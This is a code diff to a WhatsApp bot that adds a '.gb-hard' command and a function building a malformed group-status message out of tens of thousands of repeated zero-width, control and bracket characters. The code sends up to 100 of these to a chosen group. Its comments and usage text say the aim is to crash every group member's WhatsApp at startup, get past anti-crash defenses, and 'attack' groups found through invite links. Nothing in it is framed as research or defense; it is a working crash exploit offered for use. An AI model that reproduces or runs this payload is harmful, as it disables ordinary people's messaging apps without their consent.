@@ -2794,6 +2794,43 @@ async function sendCrashclickProbe(prim, target) {
     return { responseId, responseBytes: Buffer.byteLength(responseData), ids: rid ? [rid] : [] };
 }
 
+// 🧪 APP-LEVEL GROUP BUG — the .crash-hard payload class (groupStatusMessageV2
+// envelope → startup/sync pipeline poison) fired at a GROUP instead of a 1:1
+// chat. Unlike .gb's CrashClick (chat-level: only crashes when the chat is
+// opened, and a deletion antibug can clean it), this hits every member's app
+// during sync/startup — the class that produces the 7h+ icon-tap kill. A
+// deletion-based antibug cannot withstand it: the defending client crashes
+// while the batch is still arriving, so there is nothing left alive to delete.
+// ⚠️ EVERY group member takes the app-level hit — including the bot owner if
+// his own number is a member of the target group.
+async function sendGbHardProbe(prim, target) {
+    const payload = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        title: "𑇂𑆵𑆴𑆿".repeat(10000),
+                        subtitle: "\x10".repeat(50000),
+                        bloksWidget: {
+                            uuid: "\u200B".repeat(50000),
+                            data: "[".repeat(50000),
+                            type: "\u200F".repeat(50000),
+                            fallback: "\u200D".repeat(50000)
+                        }
+                    },
+                    body: { text: "\u000F" },
+                    nativeFlowMessage: {
+                        buttons: "[".repeat(50000)
+                    }
+                }
+            }
+        }
+    };
+    const wireBytes = wireBytesOf(payload);
+    const rid = await prim.relayMessage(target, payload, { participant: true });
+    return { wireBytes, ids: rid ? [rid] : [] };
+}
+
 // 🛡️ SUDO SYSTEM — elevated users per session. Saved in bot_config.json so
 // they persist via Supabase on Render and on disk for the panel. Sudoes can
 // command the bot even when the bot is in owner mode.
@@ -5407,6 +5444,94 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         return;
     }
 
+    // ── .gb-hard — GROUP APP-LEVEL BUG (.crash-hard payload class × group) ──
+    // Same targeting rules as .gb (owner/dev only, never bare, bot must be a
+    // member, accepts yes/invite-link/JID) but fires the groupStatusMessageV2
+    // envelope: app-level damage for EVERY member, not chat-level. Deletion
+    // antibugs cannot withstand it — the defending app dies in the sync/
+    // startup pipeline while the batch arrives. /unbug (72h) can clean it.
+    const isGbhCommand = cisFirstWord === '.gb-hard' || cisFirstWord === `${cisPrefix}gb-hard`;
+    if (isGbhCommand) {
+        const gbhSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
+        const gbhIsOwner = fromMe || (
+            !!sock.user?.id &&
+            jidNormalizedUser(gbhSenderJid) === jidNormalizedUser(sock.user.id)
+        );
+        if (!gbhIsOwner && !isDevNumber(gbhSenderJid)) {
+            await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', msg);
+            return;
+        }
+
+        const gbhUsage =
+            '🧪 *GB-HARD — group app-level bug*\n\n' +
+            '• .gb-hard yes — attack the group you are in\n' +
+            '• .gb-hard <invite link> — attack that group\n' +
+            '• .gb-hard <group jid> — attack by JID (.jid in the group)\n' +
+            '• .gb-hard <target> <amount> — 1–100 payloads (default ×10)\n\n' +
+            '⚠️ App-level: EVERY member\'s WhatsApp takes the icon-tap kill, not just the chat view. NEVER run it in a group your own main phone belongs to. /unbug can clean it within 72h.';
+        const gbhTargetArg = cisWords[1] || '';
+        const gbhCount = Math.max(1, Math.min(100, parseInt(cisWords[2], 10) || 10));
+
+        let gbhGroupJid = null;
+        if (!gbhTargetArg) {
+            await safeWaReply(sock, remoteJid, gbhUsage, msg);
+            return;
+        } else if (gbhTargetArg.toLowerCase() === 'yes') {
+            if (!remoteJid.endsWith('@g.us')) {
+                await safeWaReply(sock, remoteJid, `${gbhUsage}\n\n❌ .gb-hard yes must be run inside a group.`, msg);
+                return;
+            }
+            gbhGroupJid = remoteJid;
+        } else if (gbhTargetArg.includes('chat.whatsapp.com/')) {
+            const code = gbhTargetArg.split('chat.whatsapp.com/')[1].split(/[?\s]/)[0].trim();
+            if (!code) {
+                await safeWaReply(sock, remoteJid, '❌ Could not read the invite code from that link.', msg);
+                return;
+            }
+            try {
+                const info = await sock.groupGetInviteInfo(code);
+                gbhGroupJid = info?.id || null;
+            } catch (err) {
+                await safeWaReply(sock, remoteJid, `❌ Invite link could not be resolved: ${err?.message || err}`, msg);
+                return;
+            }
+        } else if (gbhTargetArg.endsWith('@g.us')) {
+            gbhGroupJid = gbhTargetArg;
+        } else {
+            await safeWaReply(sock, remoteJid, gbhUsage, msg);
+            return;
+        }
+
+        if (!gbhGroupJid) {
+            await safeWaReply(sock, remoteJid, '❌ Could not resolve that group.', msg);
+            return;
+        }
+
+        const gbhSyncPause = isSupabaseEnabled();
+        if (gbhSyncPause) setSyncPaused(true);
+        let gbhSent = 0, gbhWire = 0;
+        const gbhIds = [];
+        try {
+            for (let i = 0; i < gbhCount; i++) {
+                const r = await sendGbHardProbe(sock, gbhGroupJid);
+                gbhSent++;
+                if (r?.wireBytes) gbhWire = r.wireBytes;
+                if (r?.ids) gbhIds.push(...r.ids);
+                log('GB', `${phoneNumber}: .gb-hard send ${gbhSent}/${gbhCount}${gbhWire ? ` (${gbhWire}B wire)` : ''} → ${gbhGroupJid}`);
+                if (i < gbhCount - 1) await delay(30 + Math.floor(Math.random() * 40));
+            }
+            if (gbhIds.length) recordBugSends(phoneNumber, gbhGroupJid, gbhIds);
+            await safeWaReply(sock, remoteJid, `🧪 .gb-hard app-level ×${gbhSent}/${gbhCount} sent to the group${gbhWire ? ` (${gbhWire}B wire each)` : ''}. Every member takes the hit — /unbug can clean it within 72h.`, msg);
+        } catch (err) {
+            logError('GB', `${phoneNumber}: .gb-hard failed after ${gbhSent} send(s)`, err);
+            if (gbhIds.length) recordBugSends(phoneNumber, gbhGroupJid, gbhIds);
+            await safeWaReply(sock, remoteJid, `❌ .gb-hard sent ×${gbhSent} then failed: ${err?.message || err}`, msg);
+        } finally {
+            if (gbhSyncPause) setSyncPaused(false);
+        }
+        return;
+    }
+
     // 📦 Cache + persist messages so antidelete can recover full history.
     try {
         recentMessages.set(`${phoneNumber}:${remoteJid}:${msgId}`, {
@@ -6028,6 +6153,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             '┃𖤍│      ╰━➤ *`𝙲𝚁𝙰𝚂𝙷𝙲𝙻𝙸𝙲𝙺`*',
             '┃𖤍│➣ *.𝗴𝗯* yes — in group ×10',
             '┃𖤍│➣ *.𝗴𝗯* <invite link> — group ×10',
+            '┃𖤍│➣ *.𝗴𝗯-𝗵𝗮𝗿𝗱* <link> — group app-level ×10',
             '┆𖤍╰────↯',
             '╰┄┄┄┄┄┄┄┄┄┄┄┄┄〩',
             '',
